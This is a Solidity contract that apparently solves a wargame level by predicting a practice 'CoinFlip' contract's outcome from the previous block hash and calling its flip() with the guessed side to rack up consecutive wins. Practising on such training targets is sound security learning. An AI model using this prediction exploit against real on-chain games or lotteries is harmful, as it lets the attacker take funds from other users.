// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract L3Solution {
    address contractAddy = 0xa68a039E7945309329b5eCa5E08AE2aE81BFDbB0;
    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guessFlip(address _oriAddy) external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number -1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = ICoinFlip(_oriAddy).flip(side); 
        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }
       
       return consecutiveWins;
    }
}